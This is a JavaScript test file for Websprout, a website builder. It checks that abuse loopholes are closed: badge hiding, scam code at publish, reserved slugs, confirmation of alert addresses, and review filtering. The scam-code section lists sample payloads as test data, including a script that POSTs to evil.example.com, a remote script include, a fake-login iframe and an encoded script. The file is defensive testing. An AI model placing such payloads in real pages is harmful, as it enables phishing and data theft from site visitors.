// Customer loopholes that were closed: each check is a way someone could have gotten Pro value, sent spam through
// Websprout, or slipped a scam page past the content check.
const lib = require('./lib');
const { createSite, post, signIn, cookie } = lib;

module.exports = async function (ctx, t) {
  const { base } = ctx;
  const mail = async (to) => (await fetch(base + '/__test/mail?to=' + encodeURIComponent(to))).json();
  const id = Date.now().toString(36);

  // 1. The free badge always shows: the text "ws-badge" in a page no longer switches it off, and it shows once.
  const s = await createSite(base, { name: 'Badge Bakery', type: 'Bakery', city: 'Austin' });
  const slug = 'qa-badge-' + id;
  const html = s.html.replace('</body>', '<p>ws-badge</p><style>#ws-badge{display:none!important}</style></body>');
  let r = await lib.pubPost(base, { html, siteId: s.siteId, key: s.formKey, slug });
  t.eq(r.status, 200, 'free site publishes');
  const live = await (await fetch(base + '/s/' + slug)).text();
  t.eq((live.match(/<div id="ws-badge"/g) || []).length, 1, 'free site shows the badge exactly once even with "ws-badge" in its text');
  t.ok(/body #ws-badge\[id\]\{display:flex!important/.test(live), 'badge styles win over page CSS that hides it');

  // 2. Hidden scam code is refused at publish.
  const scams = {
    'encoded script': '<script>document.body.innerHTML=atob("PGZvcm0+")</script>',
    'password field': '<form><input type="password" name="p"></form>',
    'script posting elsewhere': '<script>fetch("https://evil.example.com/c",{method:"POST"})</script>',
    'script from another site': '<script src="https://evil.example.com/x.js"></script>',
    'full-page frame': '<iframe src="https://evil.example.com/login"></iframe>',
  };
  for (const k of Object.keys(scams)) {
    const sc = await createSite(base, { name: 'Joes Bakery', type: 'Bakery' });
    r = await lib.pubPost(base, { html: sc.html.replace('</body>', scams[k] + '</body>'), siteId: sc.siteId, key: sc.formKey, slug: 'qa-scam-' + id + '-' + Object.keys(scams).indexOf(k) });
    t.ok(r.status === 422 && r.json && r.json.moderation, 'publish refuses a page with a ' + k + ' (' + r.status + ')');
  }

  // 3. Names that look official are reserved.
  for (const name of ['billing', 'checkout', 'secure', 'account']) {
    const sr = await createSite(base, { name: 'Shop', type: 'Bakery' });
    r = await lib.pubPost(base, { html: sr.html, siteId: sr.siteId, key: sr.formKey, slug: name });
    t.ok(r.status >= 400 && /reserved/i.test(r.text), '"' + name + '" can\'t be taken as a site address');
  }

  // 4. Lead alerts can't be pointed at a stranger: another address needs a confirmation click first.
  const n = await createSite(base, { name: 'Notify Co', type: 'Plumber' });
  const stranger = 'stranger.' + id + '@victim.test';
  r = await post(base, '/api/inbox/notify', { site: n.siteId, key: n.formKey, email: stranger });
  t.ok(r.status === 200 && r.json && r.json.pending === true, 'a new alert address is pending, not saved');
  let inbox = await (await fetch(base + '/api/inbox?site=' + n.siteId + '&key=' + n.formKey)).json();
  t.ok(inbox.notify !== stranger, 'the unconfirmed address gets no lead alerts');
  const conf = await mail(stranger);
  t.ok(conf && /Confirm/i.test(conf.subject), 'the address gets a confirmation email instead');
  const link = conf && (/href="([^"]*notify\/confirm[^"]*)"/.exec(conf.html) || [])[1];
  t.ok(!!link, 'confirmation email has a link');
  if (link) {
    const path = link.replace(/^https:\/\/websprout\.app/, '');
    const g = await fetch(base + path);
    t.ok(/Yes, send me messages/.test(await g.text()), 'opening the link only shows a button (mail scanners can\'t confirm it)');
    inbox = await (await fetch(base + '/api/inbox?site=' + n.siteId + '&key=' + n.formKey)).json();
    t.ok(inbox.notify !== stranger, 'still not saved after just opening the link');
    const p = await fetch(base + path, { method: 'POST' });
    t.eq(p.status, 200, 'pressing the button confirms');
    inbox = await (await fetch(base + '/api/inbox?site=' + n.siteId + '&key=' + n.formKey)).json();
    t.eq(inbox.notify, stranger, 'confirmed address now gets lead alerts');
  }
  // The signed-in owner's own address is saved straight away.
  const ownerEmail = 'owner.' + id + '@example.com';
  const sess = await signIn(base, ownerEmail);
  r = await post(base, '/api/inbox/notify', { site: n.siteId, key: n.formKey, email: ownerEmail }, { Cookie: cookie(sess) });
  t.ok(r.status === 200 && r.json && !r.json.pending && r.json.notify === ownerEmail, 'the owner\'s own address is saved right away ' + r.status + ' ' + JSON.stringify(r.json));

  // 5. Contact forms and reviews for made-up site IDs store nothing.
  r = await post(base, '/api/form/zzzz' + id, { email: 'a@b.test', message: 'hi' });
  t.eq(r.status, 200, 'a form post to a made-up site is accepted quietly');
  r = await post(base, '/api/review', { site: 'zzzz' + id, name: 'X', rating: 5, text: 'Great' });
  t.eq(r.status, 200, 'a review for a made-up site is accepted quietly');

  // 6. Owner-added reviews get the word check.
  const owner2 = 'rev.' + id + '@example.com';
  const s2 = await signIn(base, owner2);
  const rs = await createSite(base, { name: 'Review Spot', type: 'Bakery' });
  await post(base, '/save', { siteId: rs.siteId, key: rs.formKey, html: rs.html, name: 'Review Spot' }, { Cookie: cookie(s2) });
  r = await post(base, '/api/reviews/manage', { site: rs.siteId, action: 'add', name: 'Sam', rating: 5, text: 'This place is shit' }, { Cookie: cookie(s2) });
  t.ok(r.status === 422, 'an owner-added review with profanity is refused (' + r.status + ')');
};
